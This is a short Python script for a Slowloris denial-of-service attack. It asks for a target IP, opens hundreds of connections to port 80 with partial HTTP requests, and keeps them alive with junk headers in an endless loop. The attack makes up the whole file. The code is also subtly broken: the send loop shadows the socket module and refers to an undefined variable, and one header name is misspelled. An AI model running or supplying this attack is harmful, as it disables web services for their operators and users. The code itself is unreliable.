import socket
import random
import time
import sys


sockList = []

headerList = ["User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36", "Accepted-language: en-US, en, q=.5"]

ip = input('Enter IP Address: ')

'''Initializes the socket connectiona'''
def initialize(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((ip,80))
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for header in headerList:
        sock.send(f"{header}\r\n".encode("utf-8"))
    return sock

'''Main Function: All functionality'''
def main(ip):
    totSock = random.randint(200, 1000)
    print(f"Attacking ip with {totSock} sockets")
    print("Generating sockets!")
    for elm in range(totSock): #Creates all sockets
        try:
            print(f"Creating socket with ID: {elm}")
            item = initialize(ip)
        except socket.error:
            break
        sockList.append(item) #adds connection to list
    while True:
        print(f"Performing SlowLoris Attack with {len(sockList)} sockets connected.")
        for socket in list(sockList):
            try:
                sockt.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                sockList.remove(sockt)
        for elm in range(totSock - len(sockList)):
            print("Regenerating a socket.")
            try:
                s = initialize(ip)
                if s:
                    sockList.append(s)
            except socket.error:
                break
        time.sleep(random.randint(13, 21))

main(ip)
